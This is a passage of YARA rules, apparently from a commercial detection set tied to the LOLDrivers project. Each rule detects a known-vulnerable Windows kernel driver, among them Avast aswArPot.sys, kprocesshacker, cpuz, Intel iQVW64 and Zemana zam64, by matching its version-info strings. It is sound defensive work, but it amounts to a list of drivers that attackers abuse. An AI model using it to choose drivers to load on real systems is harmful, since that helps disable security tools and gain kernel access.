  date = \"2024-08-07 19:18:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0030002e0030002e0031003100310038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410045004700490053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300035002d00320030003000370020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Symanteccorporation_Vproeventmonitorsys_Symanteceventmonitorsdriverdevelopmentedition_7877_RID51DF : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - VProEventMonitor.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 09:02:39\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600500072006f004500760065006e0074004d006f006e00690074006f0072002e0053007900730020002d0020004500760065006e00740020004d006f006e00690074006f00720069006e00670020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00530079006d0061006e00740065006300200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e00340035003700300038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]005600500072006f004500760065006e0074004d006f006e00690074006f0072002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00530079006d0061006e0074006500630020004500760065006e00740020004d006f006e00690074006f00720073002000440072006900760065007200200044006500760065006c006f0070006d0065006e0074002000450064006900740069006f006e } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]005600500072006f004500760065006e0074004d006f006e00690074006f0072002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200032003000300037002d0032003000300038002000530079006d0061006e00740065006300200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Wj_Kprocesshacker_C725_RID34DD : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - kprocesshacker.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 15:48:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004b00500072006f0063006500730073004800610063006b00650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0077006a00330032 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0038 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004b00500072006f0063006500730073004800610063006b00650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006b00700072006f0063006500730073006800610063006b00650072002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]004c006900630065006e00730065006400200075006e006400650072002000740068006500200047004e0055002000470050004c002c002000760033002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpot_Avastantivirus_7AD0_RID3D6D : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:54:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200041006e0074006900200052006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320030002e0034002e00380033002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320030002e0034002e00380033002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300032003000200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_83A1_RID3BB2 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:40:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f007700730020004e0054002f0032003000300030002f0058005000200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002c00200031002c00200030002c00200031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002c00200031002c00200030002c00200031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003500200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_C082_RID3DA9 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:04:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00360030002e0030002e0031003000380034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00360030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000200028004300290020002000320030003200300020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule PUA_VULN_Driver_Creativetechnologyinnovationcoltd_Ctiiosys_Ctiiodriverversion_X_2121_RID480A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - CtiIo64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:26:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00430054004900200049004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0043007200650061007400690076006500200054006500630068006e006f006c006f0067007900200049006e006e006f0076006100740069006f006e00200043006f002e002c0020004c00540064002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e003000200078003600340020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300020007800360034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043007400690049006f00360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043007400690049006f003600340020004400720069007600650072002000560065007200730069006f006e00200031002e0030 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043007400690049006f00360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003200310020004300540049 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Ssmartsoftwaresolutionsgmbh_Sysdrvs_Sysdrvs_0E53_RID402E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - SysDrv3S.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:51:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530079007300440072007600330053 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00330053002d0053006d00610072007400200053006f00660074007700610072006500200053006f006c007500740069006f006e007300200047006d00620048 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002c0035002c0036002c0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0035002e0036002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00530079007300440072007600330053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00530079007300440072007600330053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00530079007300440072007600330053002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200032003000300036002d0032003000310034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpotsys_Avastantivirus_14AD_RID3ECA : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:52:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310037002e0039002e0033003700350034002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310037002e0039002e0033003700350034002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003400200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Geintelligentplatformsinc_Gedevicedriver_Proficymachineedition_Build_CAC5_RID49CF : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - GEDevDrv.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 06:42:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0047004500200044006500760069006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0047004500200049006e00740065006c006c006900670065006e007400200050006c006100740066006f0072006d0073002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0037002e0030003000200028004200750069006c0064002000350035003100370029 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0037002e0030003000200028004200750069006c0064002000350035003100370029 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0047004500200044006500760069006300650020004400720069007600650072 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500072006f00660069006300790020004d0061006300680069006e0065002000450064006900740069006f006e } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00470045004400650076004400720076002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a900200032003000310031002c00200047004500200049006e00740065006c006c006900670065006e007400200050006c006100740066006f0072006d0073002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrserverddkprovider_Cpuzsys_Windowsrserverddkdriver_3871_RID45FB : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - cpuz_x64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:59:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004300500055004900440020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000530065007200760065007200200032003000300033002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e0032002e0033003700390030002e00300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e0032002e0033003700390030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000530065007200760065007200200032003000300033002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Lowleveldriver_F941_RID33DE : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - GPU-Z.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 15:06:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c006f0077002d004c006500760065006c0020004400720069007600650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00360030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00360030002e0030002e0030 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004c006f0077002d004c006500760065006c0020004400720069007600650072 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200032003000300034002d00320030003100300020002800630029002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Intelcorporation_Iqvwsys_Intelriqvwsys_37C6_RID3E0B : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - iQVW64.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:20:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049006e00740065006c0028005200290020004e006500740077006f0072006b0020004100640061007000740065007200200044006900610067006e006f00730074006900630020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e00740065006c00200043006f00720070006f0072006100740069006f006e0020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0033002e0032002e003100370020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0033002e0032002e00310037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049006e00740065006c0028005200290020006900510056005700360034002e005300590053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300032002d003200300031003800200049006e00740065006c00200043006f00720070006f0072006100740069006f006e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Toshibacorporation_Nchgbiosxsys_Toshibabiospackage_3143_RID426E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NCHGBIOS2x64.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:27:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00420049004f00530020005500700064006100740065002000440072006900760065007200200046006f0072002000570069006e0064006f007700730020007800360034002000450064006900740069006f006e } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0054004f0053004800490042004100200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0034002e0032002e0034002e00300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0034002e0032002e0034002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004e00430048004700420049004f00530032007800360034002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0054004f00530048004900420041002000420049004f00530020005000610063006b006100670065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00430048004700420049004f00530032007800360034002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200031003900390039002d003200300031003200200054004f0053004800490042004100200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Zemanaltd_Zam_5439_RID3320 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - zam64.sys, zamguard32.sys, zamguard64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:34:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005a0041004d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005a0065006d0061006e00610020004c00740064002e } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00320031002e00360033 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005a0041004d } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]005a0065006d0061006e00610020004c00740064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Sysinternalswwwsysinternalscom_Procexpsys_Processexplorer_30AB_RID463A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - procexp.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:09:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0053007900730069006e007400650072006e0061006c00730020002d0020007700770077002e0073007900730069006e007400650072006e0061006c0073002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310031002e00330030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310031002e00330030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00700072006f0063006500780070002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00700072006f0063006500780070002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d002e002000520075007300730069006e006f007600690063006800200031003900390036002d0032003000300038 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Zemanaltd_Zam_DE8F_RID3352 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - zam64.sys, zamguard32.sys, zamguard64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:42:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005a0041004d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005a0065006d0061006e00610020004c00740064002e } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00320030002e003100300034 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005a0041004d } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]005a0065006d0061006e00610020004c00740064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_0FC0_RID4218 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvoclock.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:13:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056006900640069006100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e00300030002e00300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e00300030002e00300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9004e0056004900440049004100200043006f00720070002e00200032003000300033002d0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Supermicrocomputerinc_Phymem_Phymem_1963_RID3C67 : DEMO 